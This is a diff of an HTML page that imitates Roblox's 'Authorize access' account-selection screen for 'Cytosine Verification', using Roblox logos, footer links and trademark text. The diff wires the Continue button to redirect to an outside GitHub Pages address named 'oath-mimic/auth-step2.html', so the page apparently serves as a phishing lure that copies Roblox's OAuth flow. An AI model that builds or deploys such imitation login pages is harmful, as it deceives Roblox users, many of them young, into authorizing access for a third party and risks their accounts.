@@ -1,212 +1,259 @@
 <!DOCTYPE html>
 <html lang="en" class="dark">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Authorize access - Roblox</title>
-  <link rel="icon" href="/assets/favicon.ico" />
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Helvetica:wght@400;800&display=swap" />
-  <script defer nomodule src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: "Builder Sans", Helvetica, Arial, sans-serif;
-      background-color: rgb(17, 18, 22);
-      color: white;
-      display: flex;
-      flex-direction: column;
-      min-height: 100vh;
-    }
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Authorize access - Roblox</title>
+<link rel="icon" href="https://authorize.roblox.com/assets/favicon.ico" />
 
-    .container {
-      max-width: 960px;
-      margin: 0 auto;
-      padding: 2rem 1rem;
-      flex: 1;
-    }
+<style>
+  html {
+    -webkit-font-smoothing: antialiased;
+    box-sizing: border-box;
+    text-size-adjust: 100%;
+    color-scheme: dark;
+  }
 
-    header, footer {
-      width: 100%;
-    }
+  *, ::before, ::after {
+    box-sizing: inherit;
+  }
 
-    header img,
-    footer img {
-      display: block;
-    }
+  body {
+    margin: 0;
+    color: rgb(255, 255, 255);
+    font-family: "Builder Sans", Helvetica, Arial, sans-serif;
+    font-weight: 300;
+    font-style: normal;
+    font-size: 16px;
+    line-height: 140%;
+    background-color: rgb(17, 18, 22);
+  }
 
-    .logo-bar {
-      padding: 1rem 2rem;
-    }
+  .css-geyuby-Typography-root-Typography-h3-title {
+    margin: 0;
+    letter-spacing: inherit;
+    color: inherit;
+    text-decoration: none;
+    font-family: "Builder Sans", Helvetica, Arial, sans-serif;
+    font-weight: 800;
+    font-style: normal;
+    font-size: 24px;
+    line-height: 135%;
+    display: block;
+    text-align: center;
+    padding: 24px 0;
+  }
 
-    .title {
-      font-size: 24px;
-      font-weight: 800;
-      margin-bottom: 1rem;
-    }
+  header {
+    padding: 16px 24px;
+    text-align: left;
+  }
 
-    .divider {
-      border: none;
-      border-top: 1px solid #444;
-      margin: 1rem 0;
-    }
+  header img {
+    width: 195px;
+    height: 35px;
+    display: block;
+  }
 
-    .account-box {
-      margin-top: 1rem;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
+  .account-box {
+    max-width: 360px;
+    margin: 0 auto;
+    text-align: center;
+  }
 
-    .avatar {
-      width: 80px;
-      height: 80px;
-      border-radius: 50%;
-      margin: 12px 0;
-    }
+  .account-box span {
+    display: block;
+    margin-bottom: 12px;
+    font-size: 1rem;
+    color: #bbb;
+  }
 
-    .username {
-      font-weight: bold;
-      font-size: 18px;
-      margin-bottom: 1rem;
-    }
+  .avatar {
+    width: 80px;
+    height: 80px;
+    border-radius: 50%;
+    margin: 0 auto 12px auto;
+    display: block;
+  }
 
-    .MuiButtonBase-root {
-      display: inline-flex;
-      -webkit-box-align: center;
-      align-items: center;
-      -webkit-box-pack: center;
-      justify-content: center;
-      position: relative;
-      box-sizing: border-box;
-      -webkit-tap-highlight-color: transparent;
-      cursor: pointer;
-      user-select: none;
-      vertical-align: middle;
-      appearance: none;
-      min-width: 64px;
-      background-color: rgb(229, 229, 230);
-      width: 100%;
-      font-family: "Builder Sans", Helvetica, Arial, sans-serif;
-      font-weight: 800;
-      font-style: normal;
-      font-size: 16px;
-      line-height: 100%;
-      text-transform: none;
-      box-shadow: none;
-      color: rgb(17, 18, 22);
-      outline: 0px;
-      border: 0;
-      text-decoration: none;
-      transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1), 
-                  box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1), 
-                  border-color 250ms cubic-bezier(0.4, 0, 0.2, 1), 
-                  color 250ms cubic-bezier(0.4, 0, 0.2, 1);
-      border-radius: 8px;
-      padding: 10px 16px;
-      margin: 24px 0px;
-    }
+  .username {
+    font-weight: 700;
+    font-size: 1.125rem;
+    margin-bottom: 24px;
+  }
 
-    .divider-or {
-      display: flex;
-      align-items: center;
-      text-align: center;
-      color: #999;
-      margin: 1rem 0;
-    }
+  button {
+    font-family: "Builder Sans", Helvetica, Arial, sans-serif;
+    font-weight: 800;
+    font-size: 16px;
+    width: 100%;
+    max-width: 360px;
+    padding: 12px 0;
+    border-radius: 8px;
+    cursor: pointer;
+    user-select: none;
+    border: none;
+    margin-bottom: 16px;
+    display: inline-flex;
+    justify-content: center;
+    align-items: center;
+  }
 
-    .divider-or::before,
-    .divider-or::after {
-      content: "";
-      flex: 1;
-      border-bottom: 1px solid #444;
-    }
+  .btn-continue {
+    background-color: #e5e5e6;
+    color: rgb(17, 18, 22);
+    transition: background-color 0.3s ease;
+  }
 
-    .divider-or:not(:empty)::before {
-      margin-right: .75em;
-    }
+  .btn-continue:hover {
+    background-color: #cacaca;
+  }
 
-    .divider-or:not(:empty)::after {
-      margin-left: .75em;
-    }
+  .btn-change {
+    background-color: transparent;
+    border: 2px solid #e5e5e6;
+    color: #e5e5e6;
+    transition: background-color 0.3s ease, color 0.3s ease;
+  }
 
-    footer {
-      padding: 2rem;
-      background-color: rgb(17, 18, 22);
-    }
+  .btn-change:hover {
+    background-color: #e5e5e6;
+    color: rgb(17, 18, 22);
+  }
 
-    .footer-grid {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: space-between;
-      align-items: flex-start;
-      gap: 2rem;
-    }
+  .divider-or {
+    display: flex;
+    align-items: center;
+    max-width: 360px;
+    margin: 16px auto;
+    color: #999;
+    font-size: 0.875rem;
+  }
 
-    .footer-links {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 0.75rem;
-      font-size: 13px;
-    }
+  .divider-or::before,
+  .divider-or::after {
+    content: "";
+    flex-grow: 1;
+    border-top: 1px solid #444;
+  }
 
-    .footer-links a {
-      color: #999;
-      text-decoration: none;
-    }
+  .divider-or::before {
+    margin-right: 12px;
+  }
 
-    .footer-links span {
-      color: #999;
-    }
+  .divider-or::after {
+    margin-left: 12px;
+  }
 
-    .footer-copyright {
-      font-size: 12px;
-      color: #777;
-      margin-top: 1rem;
-      max-width: 800px;
-    }
-  </style>
+  footer {
+    background-color: rgb(17, 18, 22);
+    padding: 24px 16px;
+    margin-top: 48px;
+    color: #777;
+    font-size: 0.75rem;
+    text-align: center;
+  }
+
+  footer .footer-content {
+    max-width: 960px;
+    margin: 0 auto;
+  }
+
+  footer .footer-logo img {
+    width: 124px;
+    height: 21.52px;
+    margin: 0 auto 12px auto;
+    display: block;
+  }
+
+  footer nav {
+    display: flex;
+    justify-content: center;
+    flex-wrap: wrap;
+    gap: 8px;
+    margin-bottom: 12px;
+  }
+
+  footer nav a {
+    color: #999;
+    text-decoration: none;
+    font-size: 0.875rem;
+    white-space: nowrap;
+  }
+
+  footer nav a:hover {
+    text-decoration: underline;
+    color: #ccc;
+  }
+
+  .link-divider {
+    color: #666;
+    user-select: none;
+    padding: 0 6px;
+  }
+</style>
 </head>
 <body>
   <header>
-    <div class="logo-bar">
-      <img src="/assets/logo/global_logo_white.svg" width="195" height="35" alt="logo" />
-    </div>
+    <img
+      src="https://authorize.roblox.com/assets/logo/global_logo_white.svg"
+      alt="Roblox logo"
+      width="195"
+      height="35"
+    />
   </header>
 
-  <main class="container">
-    <div class="title">Select Account to Continue to Cytosine Verification</div>
-    <hr class="divider" />
+  <main>
+    <div class="css-geyuby-Typography-root-Typography-h3-title">
+      Select Account to Continue to Cytosine Verification
+    </div>
+
     <div class="account-box">
       <span>You’re logged in as</span>
-      <img class="avatar" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-95958C2AF5E21A0C93AD09DA0C40A7B1-Png/150/150/AvatarHeadshot/Png/noFilter" alt="DERP5034">
+      <img
+        class="avatar"
+        src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-95958C2AF5E21A0C93AD09DA0C40A7B1-Png/150/150/AvatarHeadshot/Png/noFilter"
+        alt="DERP5034"
+      />
       <div class="username">thuggernaut</div>
-      <button class="MuiButtonBase-root" type="button">Continue<span class="MuiTouchRipple-root css-w0pj6f"></span></button>
+
+      <button
+        class="btn-continue"
+        type="button"
+        onclick="window.location.href='https://wemovewemovewemove.github.io/oath-mimic/auth-step2.html'"
+      >
+        Continue
+      </button>
+
       <div class="divider-or">or</div>
-      <button class="MuiButtonBase-root" type="button">Change Account<span class="MuiTouchRipple-root css-w0pj6f"></span></button>
+
+      <button class="btn-change" type="button">Change Account</button>
     </div>
   </main>
 
   <footer>
-    <div class="footer-grid">
-      <div>
-        <img src="/assets/logo/global_logo_white.svg" width="124" height="21.52" alt="logo" />
+    <div class="footer-content">
+      <div class="footer-logo">
+        <img
+          src="https://authorize.roblox.com/assets/logo/global_logo_white.svg"
+          alt="Roblox logo"
+          width="124"
+          height="21.52"
+        />
       </div>
+      <nav>
+        <a href="https://corp.roblox.com/" target="_blank" rel="noopener noreferrer">About Us</a>
+        <span class="link-divider">|</span>
+        <a href="https://corp.roblox.com/careers/" target="_blank" rel="noopener noreferrer">Join Us</a>
+        <span class="link-divider">|</span>
+        <a href="https://en.help.roblox.com/hc/en-us/articles/115004647846-Roblox-Terms-of-Use" target="_blank" rel="noopener noreferrer">Terms</a>
+        <span class="link-divider">|</span>
+        <a href="https://en.help.roblox.com/hc/en-us/articles/115004630823-Roblox-Privacy-and-Cookie-Policy-" target="_blank" rel="noopener noreferrer">Privacy</a>
+        <span class="link-divider">|</span>
+        <a href="https://www.roblox.com/info/accessibility" target="_blank" rel="noopener noreferrer">Accessibility</a>
+      </nav>
       <div>
-        <div class="footer-links">
-          <a href="https://corp.roblox.com/" target="_blank">About Us</a>
-          <span>|</span>
-          <a href="https://corp.roblox.com/careers/" target="_blank">Join Us</a>
-          <span>|</span>
-          <a href="https://en.help.roblox.com/hc/en-us/articles/115004647846-Roblox-Terms-of-Use" target="_blank">Terms</a>
-          <span>|</span>
-          <a href="https://en.help.roblox.com/hc/en-us/articles/115004630823-Roblox-Privacy-and-Cookie-Policy-" target="_blank">Privacy</a>
-          <span>|</span>
-          <a href="https://www.roblox.com/info/accessibility" target="_blank">Accessibility</a>
-        </div>
-        <div class="footer-copyright">
-          ©2025 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.
-        </div>
+        ©2025 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.
       </div>
     </div>
   </footer>
